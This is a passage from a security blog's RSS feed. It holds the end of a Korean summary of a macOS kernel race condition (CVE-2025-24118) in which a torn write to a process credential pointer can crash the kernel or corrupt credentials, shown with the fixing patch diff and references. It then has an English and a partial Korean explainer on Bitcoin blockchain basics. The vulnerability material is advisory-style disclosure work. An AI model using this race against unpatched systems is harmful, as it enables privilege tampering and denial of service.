&#xD2B8;&#xB9AC;&#xAC70;&#xD569;&#xB2C8;&#xB2E4;. &#xC5B4;&#xB290; &#xC2DC;&#xC810;&#xC5D0;&#xC11C; &#xC774;&#xB7EC;&#xD55C; &#xC77D;&#xAE30; &#xC791;&#xC5C5; &#xC911; &#xD558;&#xB098;&#xAC00; <code>p_ucred</code> &#xC5D0; &#xC808;&#xBC18; &#xC815;&#xB3C4; &#xC4F0;&#xC5EC;&#xC9C4; &#xAC12;&#xC744; &#xAD00;&#xCC30;&#xD558;&#xAC8C; &#xB418;&#xB294;&#xB370; &#xC6B4;&#xC774; &#xC88B;&#xC73C;&#xBA74; &#xD06C;&#xB798;&#xC2DC;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xACE0; &#xC544;&#xB2C8;&#xBA74; &#xC790;&#xACA9; &#xC99D;&#xBA85;&#xC774; &#xC190;&#xC0C1;&#xB429;&#xB2C8;&#xB2E4;.</p></blockquote><p><img src="/2025/02/05/OUYA77/2025-02-05/image.png" alt></p><p>PoC &#xCF54;&#xB4DC;&#xB97C; &#xB3CC;&#xB9AC;&#xBA74; &#xC790;&#xACA9; &#xC99D;&#xBA85; &#xD3EC;&#xC778;&#xD130;&#xAC00; &#xC190;&#xC0C1;&#xB418;&#xBBC0;&#xB85C; &#xCEE4;&#xB110; &#xD328;&#xB2C9;&#xC774; &#xBC1C;&#xC0DD;&#xD558;&#xAC70;&#xB098; &#xB2E4;&#xB978; &#xC790;&#xACA9; &#xC99D;&#xBA85; &#xAC1D;&#xCCB4;&#xB97C; &#xAC00;&#xB9AC;&#xD0AC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; atomic &#xD568;&#xC218;&#xB97C; &#xC9C1;&#xC811; &#xD638;&#xCD9C;&#xD558;&#xB294; &#xC2DD;&#xC73C;&#xB85C; &#xD328;&#xCE58;&#xAC00; &#xC81C;&#xC548;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c">@@ <span class="hljs-number">-3947</span>,<span class="hljs-number">9</span> +<span class="hljs-number">3947</span>,<span class="hljs-number">9</span> @@ kauth_cred_proc_update(            kauth_cred_ref(new_cred);            kauth_cred_hold(new_cred);-            zalloc_ro_mut(ZONE_ID_PROC_RO, proc_get_ro(p),+            zalloc_ro_mut_atomic(ZONE_ID_PROC_RO, proc_get_ro(p),                offsetof(struct proc_ro, p_ucred),-                &amp;new_cred, <span class="hljs-keyword">sizeof</span>(struct ucred *));+                ZRO_ATOMIC_XCHG_LONG, (<span class="hljs-keyword">uint64_t</span>)new_cred);            kauth_cred_drop(cur_cred);            ucred_rw_unref_live(cur_cred-&gt;cr_rw);</code></pre><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-24118">https://nvd.nist.gov/vuln/detail/CVE-2025-24118</a></p><p><a href="https://securityonline.info/poc-exploit-released-for-macos-kernel-vulnerability-cve-2025-24118-cvss-9-8/">https://securityonline.info/poc-exploit-released-for-macos-kernel-vulnerability-cve-2025-24118-cvss-9-8/</a></p><p><a href="https://support.apple.com/en-us/122067">https://support.apple.com/en-us/122067</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/OUYA77/">OUYA77</category>
      
      <category domain="https://hackyboiz.github.io/tags/macOS/">macOS</category>
      
      <category domain="https://hackyboiz.github.io/tags/kernel/">kernel</category>
      
      <category domain="https://hackyboiz.github.io/tags/race-condition/">race condition</category>
      
      <category domain="https://hackyboiz.github.io/tags/credentials/">credentials</category>
      
      <category domain="https://hackyboiz.github.io/tags/SMR/">SMR</category>
      
      <category domain="https://hackyboiz.github.io/tags/XNU/">XNU</category>
      
      
      <comments>https://hackyboiz.github.io/2025/02/05/OUYA77/2025-02-05/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] Blockchain Basics: Bitcoin and Beyond (en)</title>
      <link>https://hackyboiz.github.io/2025/01/26/bekim/blockchain/en/</link>
      <guid>https://hackyboiz.github.io/2025/01/26/bekim/blockchain/en/</guid>
      <pubDate>Sun, 26 Jan 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;p&gt;Hello! This is Bekim and It&amp;#x</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>Hello! This is Bekim and It&#x2019;s my first time introducing myself. I&#x2019;ve written my first research post on blockchain. There&#x2019;s so much material to cover, and I have been thinking a lot about how to narrow down the topic.<br><img src="/2025/01/26/bekim/blockchain/en/image.png" alt><br>So, I&#x2019;d like to explain the structure of blockchain based on the Bitcoin whitepaper, which is essential for understanding it. I don&#x2019;t know how my research writing will progress in the future&#x1F92A;. but who cares.</p><p>Let&#x2019;s get started!</p><h1 id="1-Bitcoin-A-Peer-to-Peer-Electronic-Cash-System"><a href="#1-Bitcoin-A-Peer-to-Peer-Electronic-Cash-System" class="headerlink" title="1. Bitcoin: A Peer-to-Peer Electronic Cash System"></a>1. Bitcoin: A Peer-to-Peer Electronic Cash System</h1><p>In Oct 2008, a mysterious figure known as Satoshi Nakamoto released a paper titled Bitcoin: A Peer-to-Peer Electronic Cash System on The Cryptography Mailing List. This paper introduced an innovative electronic cash system that allows direct peer-to-peer(P2P) transactions without relying on centralized institutions, such as banks, found in traditional systems.</p><h1 id="2-The-limitations-of-existing-trust-based-systems"><a href="#2-The-limitations-of-existing-trust-based-systems" class="headerlink" title="2. The limitations of existing trust-based systems"></a>2. The limitations of existing trust-based systems</h1><p>The Bitcoin whitepaper mentions the double-spending problem as the primary issue with traditional digital currency systems. Unlike physical currency, digital assets can be duplicated and reused, which is why centralized authorities were necessary to verify transactions and prevent misuse.</p><p>However, this centralized approach also has some clear downsides. First, transaction fees charged by intermediaries made small transactions inefficient. Second, all transactions had to go through a central server, the system was less efficient in terms of processing speed. Lastly, centralized systems are vulnerable to a Single Point of Failure&#x2014;if the central server is compromised or malfunctions, the entire system could collapse &#x1F47B;</p><p>To address these problems. Bitcoin introduced a structure based on a hash chain. In Bitcoin, transactions are linked through a hash chain, forming a secure and interconnected data structure. This design prevents double-spending and enables decentralized transaction verification without relying on a central authority.</p><h1 id="3-HashChain"><a href="#3-HashChain" class="headerlink" title="3. HashChain"></a>3. HashChain</h1><p>A hash chain is a value created by repeatedly applying a cryptographic hash functionh to a string x.</p><p>For example:<br><pre><code class="hljs lisp">h(<span class="hljs-name">h</span>(<span class="hljs-name">h</span>(<span class="hljs-name">h</span>(<span class="hljs-name">x</span>))))</code></pre><br>Applying the hash fuction four times creates a hash chain of length 4, which is denoted as <script type="math/tex">h^4(x)</script>. Each value generated at every step is based on the hash result of the previous step. This structure ensures data integrity and is widely used in cryptographic verification mechanisms.</p><p>Bitcoin, implemented as a blockchains, also relies on a hash chain to link data and form a structure where every block is cryptographically connected to the previous one.<br><img src="/2025/01/26/bekim/blockchain/en/image1.png" alt><br>Let me explain it using the example in the image above. &#x1F576;&#xFE0F;<br><strong>Block 100</strong></p><ul><li>The header contains the hash value of the previous block Hash(Block 99), the block&#x2019;s data (Payload 100), and the nonce (a value required for proof of work)</li><li>Based on this information, a unique hash value for Block 100 is generated<br><strong>Block 101</strong></li><li>The header of Block 101 includes the hash value of Block 100.</li><li>By adding Payload 101 and the nonce, a new hash value unique to Block 101 is generated.<br><strong>Block 102</strong></li><li>In the same way, BBlock 102 is linked to Block 101 by referencing the hash value of Block 101 in its header.</li><li>Through this process, all blocks are cryptographically linked, forming a chain structure. </li></ul><p>This structure plays a crucial role in protecting the data from tampering.  For example, if the data in Block 100 (Payload 100) is altered, the hash value of Block 100 changes and breaks the link to Block 101. This disruption then triggers all subsequent blocks to become invalid. In this way, blockchain ensures the integrity of its data.</p><h2 id="3-1-Transaction"><a href="#3-1-Transaction" class="headerlink" title="3.1. Transaction"></a>3.1. Transaction</h2><p><img src="/2025/01/26/bekim/blockchain/en/image2.png" alt></p><blockquote><p>image source: Bitcoin: A Peer-to-Peer Electronic Cash System</p></blockquote><p>As mentioned earlier, Bitcoin transaction also follow the principles of a hash chain. In this context, a transaction refers to the basic unit used to send or transfer Bitcoin within the network. These transaction records are stored on the blockchain and maintained in a <strong>distributed ledger</strong> shared by all participants in the Bitcoint network</p><p>Each transaction is linked by including the hash value of the previous transaction, thereby creating a chain. For instance, as shown in the image, the transaction from Owner 1 includes the hash value of Owner 0&#x2019;s transaction, proving that Owner 1 has legitimately received ownership of the asset.</p><p>Additionally, each transaction includes the <strong>public key</strong> and <strong>digital signature</strong> of the current owner. The network uses the public key to verify the digital signature, ensuring that the transaction has not been forged. Subsequently, when Owner 2 creates a new transaction, they reference Owner 1&#x2019;s transaction and add their own digital signature. This process repeats, linking transactions together into a hash chain.</p><p>Thanks to this structure, if even a single transaction is altered, all subsequent transactions become invalid, ensuring the integrity of the data.</p><h1 id="4-Proof-of-Work-PoW"><a href="#4-Proof-of-Work-PoW" class="headerlink" title="4. Proof of Work (PoW)"></a>4. Proof of Work (PoW)</h1><p>In the Bitcoin network, new currency is created and transactions are processed by adding new blocks to the blockchain. At the heart of this process lies a key mechanism called Proof of Work (PoW).<br><img src="/2025/01/26/bekim/blockchain/en/image3.png" alt><br>To put it simply, Proof of Work requires miners to <strong>&#x201C;prove they&#x2019;ve done the work&#x201D;</strong> by solving complex mathematical problems. The first miner to successfully solve the problem earns the right to add a new block to the blockchain and is rewarded with Bitcoin as an incentive.</p><p>Since decentralized systems lack a central authority to oversee transactions, a mechanism that all participants can trust and agree upon is essential. Proof of Work plays an important role in enabling this consensus and maintaining the integrity of the system.<br><img src="/2025/01/26/bekim/blockchain/en/image4.png" alt><br>Here is the process in more detail.</p><p>Miners work to solve what is called a hash puzzle by continuously adjusting a nonce value. For a new block to be considered valid, the hash output must meet a specific condition, such as starting with a series of &#x201C;zeros&#x201D;.</p><p>The Bitcoin network is designed to generate a new block approximately every 10 minutes. To maintain this interval, the network dynamically adjusts the difficulty level. The difficulty is determined by the number of leading zeros required in the hash output. As the number of required zeros increases, the computational effort needed to find a valid hash grows exponentially. In the past, eight leading zeros were enough, but by 2024, the difficulty has grown to require 19 leading zeros. This dramatic rise in difficulty means mining now demands immense computational resources and energy, making it almost impossible for ordinary computers to compete.</p><p>Proof of Work plays a key role in ensuring the integrity of data within the blockchain network and helps participants reach consensus through the Longest Chain Rule.<br><img src="/2025/01/26/bekim/blockchain/en/image5.png" alt></p><blockquote><p>Image Source: The longest chain accounts for the greatest PoW effort and is admitted as the main chain, ResearchGate.</p></blockquote><p>When multiple miners generate new blocks at the same time, the network can temporarily split into two or more chains&#x2014;a situation referred to as a fork. In such cases, participants in the network must decide which chain to trust.</p><p>In that case, The Longest Chain Rule resolves this by recognizing the chain with the most Proof of Work (PoW) as the main chain. In other words, the longest chain is considered valid because it represents the greatest amount of computational effort.<br>As shown in the image, blocks in the losing chain labeled as <strong>stale blocks</strong> are discarded by the network. However, the transactions within these stale blocks are not lost; they are re-included in the main chain at a later time.</p><p>Through this process, all participants in the network stick to the longest chain, ensuring data integrity and reliability while maintaining consensus in a decentralized environment. &#x1F646;</p><p>So far, we have explored the principles and core mechanisms of blockchain, focusing on the Bitcoin whitepaper. In this post, I aimed to explain how blockchain maintains decentralization and ensures data integrity.</p><p>While this first piece takes a broad look at the fundamentals of blockchain, my next research post will dive deeper into other consensus algorithms beyond Proof of Work (PoW).<br>I hope this article has been helpful for readers looking to understand blockchain and its key concepts&#x1F600;</p><h3 id="Bitcoin-for-Beginners"><a href="#Bitcoin-for-Beginners" class="headerlink" title="Bitcoin for Beginners"></a>Bitcoin for Beginners</h3><ul><li>Distributed Ledger: A shared transaction record held by all network participants.</li><li>Digital Signature: An electronic signature generated using a private key.</li><li>You can check Bitcoin block creation in real-time at <a href="https://bitaps.com/">https://bitaps.com/</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/bekim/">bekim</category>
      
      <category domain="https://hackyboiz.github.io/tags/bitcoin/">bitcoin</category>
      
      <category domain="https://hackyboiz.github.io/tags/blockchain/">blockchain</category>
      
      <category domain="https://hackyboiz.github.io/tags/PoW/">PoW</category>
      
      
      <comments>https://hackyboiz.github.io/2025/01/26/bekim/blockchain/en/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] Blockchain Basics: Bitcoin and Beyond (ko)</title>
      <link>https://hackyboiz.github.io/2025/01/26/bekim/blockchain/ko/</link>
      <guid>https://hackyboiz.github.io/2025/01/26/bekim/blockchain/ko/</guid>
      <pubDate>Sun, 26 Jan 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;p&gt;&amp;#xC548;&amp;#xB155;&amp;#xD558;&amp;#xC13</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;! &#xC0C8;&#xB85C; &#xC778;&#xC0AC; &#xB4DC;&#xB9AC;&#xB294; bekim&#xC785;&#xB2C8;&#xB2E4;. &#xBE14;&#xB85D;&#xCCB4;&#xC778;&#xC744; &#xC8FC;&#xC81C;&#xB85C; &#xCC98;&#xC74C; &#xC5F0;&#xAD6C;&#xAE00;&#xC744; &#xC791;&#xC131;&#xD574;&#xBCF4;&#xB294;&#xB370;&#xC694;. &#xC790;&#xB8CC;&#xC758; &#xC591;&#xC774; &#xB9CE;&#xAE30;&#xB3C4; &#xD558;&#xACE0;, &#xC774; &#xC8FC;&#xC81C;&#xB97C; &#xC5B4;&#xB5BB;&#xAC8C; &#xC881;&#xD600;&#xAC08;&#xC9C0; &#xACE0;&#xBBFC;&#xC774; &#xB9CE;&#xC558;&#xC5B4;&#xC694;.<br><img src="/2025/01/26/bekim/blockchain/ko/image.png" alt><br>&#xADF8;&#xB798;&#xC11C; &#xC800;&#xB294; &#xBE14;&#xB85D;&#xCCB4;&#xC778;&#xC744; &#xC774;&#xD574;&#xD558;&#xB294;&#xB370; &#xD544;&#xC218;&#xC801;&#xC778; &#xBE44;&#xD2B8;&#xCF54;&#xC778; &#xBC31;&#xC11C;&#xB97C; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xBE14;&#xB85D;&#xCCB4;&#xC778; &#xAD6C;&#xC870;&#xB97C; &#xBA3C;&#xC800; &#xC124;&#xBA85;&#xD574;&#xBCF4;&#xB824;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;. &#xC55E;&#xC73C;&#xB85C; &#xC5F0;&#xAD6C;&#xAE00;&#xC774; &#xC5B4;&#xB5BB;&#xAC8C; &#xD758;&#xB7EC;&#xAC08;&#xC9C0;&#xB294; &#xBBF8;&#xB798;&#xC758; &#xC81C;&#xAC00; &#xACB0;&#xC815;&#xD560;&#xD14C;&#xB2C8;, &#xAC70;&#xB450;&#xC808;&#xBBF8;&#xD558;&#xACE0; &#xC2DC;&#xC791;&#xD560;&#xAC8C;&#xC694;.</p><h1 id="1-Bitcoin-A-Peer-to-Peer-Electronic-Cash-System"><a href="#1-Bitcoin-A-Peer-to-Peer-Electronic-Cash-System" class="headerlink" title="1. Bitcoin: A Peer-to-Peer Electronic Cash System"></a>1. Bitcoin: A Peer-to-Peer Electronic Cash System</h1><p>2008&#xB144; 10&#xC6D4;, &#x201C;&#xC0AC;&#xD1A0;&#xC2DC; &#xB098;&#xCE74;&#xBAA8;&#xD1A0;&#x201D; &#xB77C;&#xB294; &#xAC00;&#xBA85;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xC2E0;&#xC6D0; &#xBBF8;&#xC0C1;&#xC758; &#xC778;&#xBB3C;&#xC774; Bitcoin: A Peer-to-Peer Electronic Cash System&#xC774;&#xB77C;&#xB294; &#xB17C;&#xBB38;&#xC744; The Cryptography Mailing List&#xC5D0; &#xBC1C;&#xD45C;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xB17C;&#xBB38;&#xC740; &#xC2E0;&#xB8B0;&#xD560; &#xC218; &#xC788;&#xB294; &#xC81C; 3&#xC790;(ex. &#xC740;&#xD589;)&#xC5D0; &#xC758;&#xC874;&#xD558;&#xB294; &#xAE30;&#xC874; &#xBC29;&#xC2DD; &#xB300;&#xC2E0;, &#xAC1C;&#xC778; &#xAC04;(P2P) &#xC9C1;&#xC811; &#xAC70;&#xB798;&#xB97C; &#xAC00;&#xB2A5;&#xD558;&#xAC8C; &#xD558;&#xB294; &#xC0C8;&#xB85C;&#xC6B4; &#xC804;&#xC790; &#xD654;&#xD3D0; &#xC2DC;&#xC2A4;&#xD15C;&#xC744; &#xC81C;&#xC548;&#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><h1 id="2-The-limitations-of-existing-trust-based-systems"><a href="#2-The-limitations-of-existing-trust-based-systems" class="headerlink" title="2. The limitations of existing trust-based systems"></a>2. The limitations of existing trust-based systems</h1><p>&#xBE44;&#xD2B8;&#xCF54;&#xC778; &#xBC31;&#xC11C;&#xC5D0;&#xC11C;&#xB294; &#xAE30;&#xC874; &#xB514;&#xC9C0;&#xD138; &#xD654;&#xD3D0; &#xC2DC;&#xC2A4;&#xD15C;&#xC758; &#xAC00;&#xC7A5; &#xD070; &#xBB38;&#xC81C;&#xB85C; &#xC774;&#xC911; &#xC9C0;&#xBD88; &#xBB38;&#xC81C;&#xB97C; &#xC5B8;&#xAE09;&#xD558;&#xACE0; &#xC788;&#xC5B4;&#xC694;. &#xB514;&#xC9C0;&#xD138; &#xD654;&#xD3D0;&#xB294; &#xBB3C;&#xB9AC;&#xC801;&#xC778; &#xD654;&#xD3D0;&#xC640; &#xB2EC;&#xB9AC; &#xB3D9;&#xC77C;&#xD55C; &#xC790;&#xC0B0;&#xC744; &#xC911;&#xBCF5;&#xD574;&#xC11C; &#xC0AC;&#xC6A9;&#xD560; &#xAC00;&#xB2A5;&#xC131;&#xC774; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, &#xC774;&#xB97C; &#xBC29;&#xC9C0;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC911;&#xC559; &#xAE30;&#xAD00;&#xC774; &#xBAA8;&#xB4E0; &#xAC70;&#xB798;&#xB97C; &#xAC80;&#xC99D;&#xD574;&#xC57C; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD558;&#xC9C0;&#xB9CC; &#xC774;&#xB7F0; &#xC911;&#xC559; &#xC9D1;&#xC911;&#xC2DD; &#xBC29;&#xC2DD;&#xC5D0;&#xB294; &#xBA87; &#xAC00;&#xC9C0; &#xD55C;&#xACC4;&#xAC00; &#xC788;&#xC5B4;&#xC694;. &#xC81C; 3&#xC790;&#xAC00; &#xAC70;&#xB798;&#xB97C; &#xC911;&#xC7AC;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xAC70;&#xB798; &#xC218;&#xC218;&#xB8CC;&#xC640; &#xAC19;&#xC740; &#xCD94;&#xAC00; &#xBE44;&#xC6A9;&#xC740;, &#xC18C;&#xC561; &#xAC70;&#xB798;&#xC5D0;&#xC11C; &#xD2B9;&#xD788; &#xBE44;&#xD6A8;&#xC728;&#xC801;&#xC774;&#xC5C8;&#xC5B4;&#xC694;. &#xB610;&#xD55C; &#xBAA8;&#xB4E0; &#xAC70;&#xB798;&#xAC00; &#xC911;&#xC559; &#xC11C;&#xBC84;&#xB97C; &#xAC70;&#xCE58;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC2DC;&#xC2A4;&#xD15C; &#xCC98;&#xB9AC; &#xC18D;&#xB3C4; &#xCE21;&#xBA74;&#xC5D0;&#xC11C;&#xB3C4; &#xD6A8;&#xC728;&#xC131;&#xC774; &#xB5A8;&#xC5B4;&#xC84C;&#xC5B4;&#xC694;. &#xB9C8;&#xC9C0;&#xB9C9;&#xC73C;&#xB85C; &#xC911;&#xC559; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0; &#xBB38;&#xC81C;&#xAC00; &#xC0DD;&#xAE30;&#xAC70;&#xB098; &#xC545;&#xC758;&#xC801;&#xC73C;&#xB85C; &#xC791;&#xB3D9;&#xD560; &#xACBD;&#xC6B0;, &#xC804;&#xCCB4; &#xC2DC;&#xC2A4;&#xD15C;&#xC774; &#xC704;&#xD5D8;&#xC5D0; &#xBE60;&#xC9C8; &#xC218; &#xC788;&#xB294; Single Point of Failure &#xBB38;&#xC81C;&#xB3C4; &#xC874;&#xC7AC;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#x1F47B;</p><p>&#xC774;&#xB7EC;&#xD55C; &#xBB38;&#xC81C;&#xB97C; &#xD574;&#xACB0;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C; &#xBE44;&#xD2B8;&#xCF54;&#xC778;&#xC740; Hashchain&#xC744; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xD55C; &#xAD6C;&#xC870;&#xB97C; &#xB3C4;&#xC785;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBE44;&#xD2B8;&#xCF54;&#xC778;&#xC758; &#x2018;Transaction(&#xAC70;&#xB798;)&#xC740; &#xC2E4;&#xC81C;&#xB85C; Hashchain&#xC73C;&#xB85C; &#xC791;&#xB3D9;&#xD558;&#xBA70;, &#xC11C;&#xB85C; &#xAC15;&#xB825;&#xD558;&#xAC8C; &#xC5F0;&#xACB0;&#xB41C; &#xB370;&#xC774;&#xD130; &#xAD6C;&#xC870;&#xB97C; &#xD615;&#xC131;&#xD558;&#xACE0; &#xC788;&#xC5B4;&#xC694;. &#xC774; &#xC124;&#xACC4;&#xB294; &#xC774;&#xC911; &#xC9C0;&#xBD88; &#xBB38;&#xC81C;&#xB97C; &#xBC29;&#xC9C0;&#xD558;&#xBA74;&#xC11C;, &#xC911;&#xC559; &#xAE30;&#xAD00; &#xC5C6;&#xC774; &#xD0C8;&#xC911;&#xC559;&#xD654;&#xB41C; &#xAC80;&#xC99D; &#xACFC;&#xC815;&#xC744; &#xAC00;&#xB2A5;&#xD558;&#xAC8C; &#xB9CC;&#xB4ED;&#xB2C8;&#xB2E4;.</p><h1 id="3-HashChain"><a href="#3-HashChain" class="headerlink" title="3. HashChain"></a>3. HashChain</h1><p>Hashchain&#xC740; &#xC554;&#xD638;&#xD559;&#xC801; &#xD574;&#xC2DC; &#xD568;&#xC218; h&#xB97C; &#xBB38;&#xC790;&#xC5F4; x&#xC5D0; &#xC5F0;&#xC18D;&#xC801;&#xC73C;&#xB85C; &#xC801;&#xC6A9;&#xD574;&#xC11C; &#xB9CC;&#xB4E4;&#xC5B4;&#xC9C4; &#xAC12;&#xC774;&#xC5D0;&#xC694;. &#xC608;&#xB97C; &#xB4E4;&#xC5B4;<br><pre><code class="hljs lisp">h(<span class="hljs-name">h</span>(<span class="hljs-name">h</span>(<span class="hljs-name">h</span>(<span class="hljs-name">x</span>))))</code></pre><br>&#xC640; &#xAC19;&#xC774; &#xD574;&#xC2DC; &#xD568;&#xC218;&#xB97C; 4&#xBC88; &#xC801;&#xC6A9;&#xD558;&#xBA74;, &#xAE38;&#xC774;&#xAC00; 4&#xC778; &#xD574;&#xC2DC; &#xCCB4;&#xC778;&#xC774; &#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; <script type="math/tex">h^4(x)</script>&#xB85C; &#xD45C;&#xAE30;&#xD558;&#xBA70;, &#xAC01; &#xB2E8;&#xACC4;&#xC5D0;&#xC11C; &#xC0DD;&#xC131;&#xB41C; &#xAC12;&#xC740; &#xC774;&#xC804; &#xB2E8;&#xACC4;&#xC758; &#xD574;&#xC2DC; &#xACB0;&#xACFC;&#xB97C; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xAD6C;&#xC870;&#xB294; &#xB370;&#xC774;&#xD130;&#xC758; &#xBB34;&#xACB0;&#xC131;&#xC744; &#xBCF4;&#xC7A5;&#xD558;&#xACE0;, &#xC554;&#xD638;&#xD559;&#xC801; &#xAC80;&#xC99D; &#xB9E4;&#xCEE4;&#xB2C8;&#xC998;&#xC5D0;&#xC11C;&#xB3C4; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xBE14;&#xB85D;&#xCCB4;&#xC778;&#xC73C;&#xB85C; &#xAD6C;&#xD604;&#xB41C; &#xBE44;&#xD2B8;&#xCF54;&#xC778; &#xB610;&#xD55C; &#xC774;&#xB7F0; &#xD574;&#xC2DC; &#xCCB4;&#xC778;&#xC744; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC5F0;&#xACB0;&#xD574;&#xC11C;, &#xBAA8;&#xB4E0; &#xBE14;&#xB85D;&#xC774; &#xC774;&#xC804; &#xBE14;&#xB85D;&#xACFC; &#xC554;&#xD638;&#xD559;&#xC801;&#xC73C;&#xB85C; &#xC5F0;&#xACB0;&#xB41C; &#xAD6C;&#xC870;&#xB97C; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xC5B4;&#xC694;.<br><img src="/2025/01/26/bekim/blockchain/ko/image1.png" alt><br>&#xC704; &#xADF8;&#xB9BC;&#xC744; &#xC608;&#xC2DC;&#xB85C; &#xB4E4;&#xC5B4;&#xC11C; &#xC27D;&#xAC8C; &#xC124;&#xBA85;&#xD574;&#xBCFC;&#xAC8C;&#xC694;. &#x1F576;&#xFE0F;<br><strong>Block 100</strong></p><ul><li>&#xD5E4;&#xB354;&#xC5D0;&#xB294; &#xC774;&#xC804; &#xBE14;&#xB85D;&#xC758; &#xD574;&#xC2DC; &#xAC12; Hash(Block 99), &#xBE14;&#xB85D;&#xC758; &#xB370;&#xC774;&#xD130;(Payload 100) &#xADF8;&#xB9AC;&#xACE0; Nonce (&#xC791;&#xC5C5; &#xC99D;&#xBA85;&#xC5D0; &#xD544;&#xC694;&#xD55C; &#xAC12;)&#xAC00; &#xD3EC;&#xD568;&#xB418;&#xC5B4; &#xC788;&#xC5B4;&#xC694;.</li><li>&#xC774; &#xC815;&#xBCF4;&#xB97C; &#xBC14;&#xD0D5;&#xC73C;&#xB85C; Block 100&#xC758; &#xACE0;&#xC720;&#xD55C; &#xD574;&#xC2DC; &#xAC12;&#xC744; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;.<br><strong>Block 101</strong></li><li>Block 101&#xC758; &#xD5E4;&#xB354;&#xC5D0;&#xB294; Block 100&#xC758; &#xD574;&#xC2DC; &#xAC12;&#xC774; &#xD3EC;&#xD568;&#xB429;&#xB2C8;&#xB2E4;.</li><li>&#xC5EC;&#xAE30;&#xC5D0; Payload 101&#xACFC; Nonce&#xB97C; &#xCD94;&#xAC00;&#xD558;&#xC5EC; Block 101&#xB9CC;&#xC758; &#xC0C8;&#xB85C;&#xC6B4; &#xD574;&#xC2DC; &#xAC12;&#xC744; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;.<br><strong>Block 102</strong></li><li>&#xAC19;&#xC740; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; Block 102&#xB294; Block 101&#xC758; &#xD574;&#xC2DC; &#xAC12;&#xC744; &#xCC38;&#xC870;&#xD558;&#xC5EC; &#xC5F0;&#xACB0;&#xB429;&#xB2C8;&#xB2E4;.</li><li>&#xC704;&#xC640; &#xAC19;&#xC740; &#xACFC;&#xC815;&#xC744; &#xD1B5;&#xD574; &#xBAA8;&#xB4E0; &#xBE14;&#xB85D;&#xC774; &#xC554;&#xD638;&#xD559;&#xC801;&#xC73C;&#xB85C; &#xC5F0;&#xACB0;&#xB41C; &#xCCB4;&#xC778; &#xAD6C;&#xC870;&#xB97C; &#xD615;&#xC131;&#xD569;&#xB2C8;&#xB2E4;.</li></ul><p>&#xC774;&#xB7F0; &#xAD6C;&#xC870;&#xB294; &#xB370;&#xC774;&#xD130; &#xBCC0;&#xC870;&#xB97C; &#xBC29;&#xC9C0;&#xD558;&#xB294;&#xB370; &#xC911;&#xC694;&#xD55C; &#xC5ED;&#xD560;&#xC744; &#xD569;&#xB2C8;&#xB2E4;. &#xC608;&#xB97C; &#xB4E4;&#xC5B4;, Block 100&#xC758; &#xB370;&#xC774;&#xD130;(Payload 100)&#xAC00; &#xBCC0;&#xACBD;&#xB41C;&#xB2E4;&#xBA74;, Block 101&#xC774; &#xCC38;&#xC870;&#xD558;&#xB294; Block 100&#xC758; &#xD574;&#xC2DC; &#xAC12;&#xC774; &#xB2EC;&#xB77C;&#xC838; &#xC720;&#xD6A8;&#xD558;&#xC9C0; &#xC54A;&#xAC8C; &#xB418;&#xACE0;, &#xACB0;&#xAD6D; Block 101 &#xC774;&#xD6C4;&#xC758; &#xBAA8;&#xB4E0; &#xBE14;&#xB85D;&#xC774; &#xBB34;&#xD6A8;&#xD654; &#xB420; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;. &#xC774;&#xB7F0; 